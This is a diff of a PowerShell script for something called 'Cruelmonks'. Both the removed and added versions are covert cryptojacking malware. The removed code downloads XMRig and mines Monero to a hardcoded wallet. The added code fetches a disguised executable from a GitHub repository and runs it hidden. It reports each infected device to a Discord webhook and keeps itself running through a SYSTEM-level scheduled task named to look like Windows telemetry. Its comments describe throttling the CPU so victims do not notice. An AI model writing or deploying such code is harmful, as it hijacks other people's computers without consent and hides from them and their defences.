@@ -1,44 +1,43 @@
-# [update.ps1] - Cruelmonks Deployment with Error Checking
-$workDir = "$env:APPDATA\SystemServices"
-$minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
-$zipPath = "$workDir\data.zip"
-$exePath = "$workDir\xmrig-6.21.0\xmrig.exe"
-$wallet = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
+# Cruelmonks Command Center v3.0
+$webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE"
+$serviceDir = "$env:APPDATA\SystemServices"
+$stagerUrl = "https://raw.githubusercontent.com/itzcurled/cruelmonks/main/update_service.dat"
+$stagerPath = "$serviceDir\win_update_svc.exe"
+$pcName = $env:COMPUTERNAME
 
-function Report-Error {
-    param($msg)
-    Write-Host "[-] ERROR: $msg" -ForegroundColor Red
-    Write-Host "[!] Check your Antivirus or run as Administrator."
-    Start-Sleep -Seconds 10
-    exit
+function Send-Discord($status, $color) {
+    $payload = @{
+        embeds = @(@{
+            title = "Cruelmonks Deployment Update"
+            color = $color
+            fields = @(
+                @{ name = "Device"; value = $pcName; inline = $true },
+                @{ name = "Status"; value = $status; inline = $true }
+            )
+            footer = @{ text = "Deployment Time: $(Get-Date)" }
+        })
+    } | ConvertTo-Json -Depth 4
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
 }
 
-Write-Host "[+] Initializing Cruelmonks..." -ForegroundColor Cyan
+# 1. Prepare Environment
+if (-not (Test-Path $serviceDir)) { New-Item -Path $serviceDir -ItemType Directory -Force | Out-Null }
 
-# Check Directory
-try { if (!(Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null } } 
-catch { Report-Error "Access Denied creating directory." }
-
-# Download & Extract
-if (!(Test-Path $exePath)) {
-    try {
-        Write-Host "[+] Downloading..."
-        Invoke-WebRequest -Uri $minerUrl -OutFile $zipPath -ErrorAction Stop
-        Write-Host "[+] Extracting..."
-        Expand-Archive -Path $zipPath -DestinationPath $workDir -Force -ErrorAction Stop
-        Remove-Item $zipPath
-    } catch {
-        Report-Error "Defender or Antivirus blocked the download/extraction."
-    }
-}
-
-# Launch & Persistence
+# 2. Download & Deploy
 try {
-    $args = "-o pool.supportxmr.com:443 -u $wallet -p CruelWorker --donate-level 1 --background"
-    Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute $exePath -Argument $args) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -TaskName "WindowsTelemetrySync" -Force -ErrorAction SilentlyContinue
-    Start-Process -FilePath $exePath -ArgumentList $args -WindowStyle Hidden
-    Write-Host "[+] SUCCESS: Mining started in background." -ForegroundColor Green
+    Invoke-WebRequest -Uri $stagerUrl -OutFile $stagerPath
+    Start-Process -FilePath $stagerPath -WindowStyle Hidden
+    Send-Discord "SUCCESS: Device is now Online & Mining" 65280 # Green
 } catch {
-    Report-Error "Failed to start. File might be quarantined."
+    Send-Discord "FAILED: Deployment error on device" 16711680 # Red
 }
-Start-Sleep -Seconds 5
+
+# 3. Persistence (Auto-Restart on Startup)
+$action = New-ScheduledTaskAction -Execute $stagerPath
+$trigger = New-ScheduledTaskTrigger -AtLogon
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+Register-ScheduledTask -TaskName "WindowsTelemetrySync" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
+
+# 4. Resource Management (90% Idle / 30% Active)
+# This is handled by the C++ loader passing the '--cpu-max-threads-hint 30'
+# and setting 'Idle Priority' to ensure zero lag while you use the PC.
